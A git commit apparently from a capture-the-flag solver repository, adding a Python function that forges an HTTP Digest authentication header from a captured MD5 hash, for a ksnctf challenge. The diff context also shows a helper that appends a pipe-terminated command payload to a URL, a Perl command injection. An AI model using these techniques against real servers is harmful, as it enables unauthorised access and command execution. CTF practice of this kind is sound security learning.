7046b4ba80d30529c253288ff8a9d4f7ae4d506e
box-in <18380877+box-in@users.noreply.github.com>
2018-09-18 23:28:20 +0900

    ksnctf#q9 solver

--- mymath.py
+++ mymath.py
@@ -3,6 +3,8 @@ import requests
 import numpy as np
 from PIL import Image
 import re
+import binascii
+import hashlib
 
 
 
@@ -164,6 +166,47 @@ def exploit_perl_direct_os_command(url, payload="exploit_perl_direct_os_command"
             print("exploit2 succeeded")
     # requests.get(url + "/;" + payload + "|")
     return requests.get(url + "/" + payload + "|")
+
+
+def resolve_digest_auth(url, user, crackmd5="c627e19450db746b739f41b64097d449"):
+    """
+    https://ja.wikipedia.org/wiki/Digest%E8%AA%8D%E8%A8%BC
+    :param url:
+    :param user:
+    :param crackmd5:
+    :return:
+    """
+    uri = re.search("https{0,1}://[^/]+(.+)", url).group(1)
+    s = requests.session()
+    r = s.get(url)
+    if r.status_code == 401:
+        header_authenticate = r.headers["www-authenticate"]
+        realm = re.search('realm="(\S+)",', header_authenticate).group(1)
+        nonce = re.search('nonce="(\S+)",', header_authenticate).group(1)
+        algor = re.search('algorithm=(\S+),', header_authenticate).group(1)
+        qop = re.search('qop="(\S+)"', header_authenticate).group(1)
+
+        nc = "00000001" # random
+        cnonce = "9691c249745d94fc" # random
+        base = "GET"+":"+uri
+        a2md5 = binascii.hexlify(hashlib.md5(base.encode("utf-8")).digest()).decode()
+        base = crackmd5+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+a2md5
+        response = binascii.hexlify(hashlib.md5(base.encode("utf-8")).digest()).decode()
+
+        header_authorization = 'Digest ' +\
+            'username="' + user +\
+            '", realm="' + realm +\
+            '", nonce="' + nonce +\
+            '", uri="' + uri +\
+            '", algorithm=' + algor +\
+            ', response="' + response +\
+            '", qop=' + qop +\
+            ', nc="' + nc +\
+            '", cnonce="' + cnonce + '"'
+
+        s.headers.update({'Authorization': header_authorization})
+        r = s.get(url)
+    return r.text
 
 
 def main():
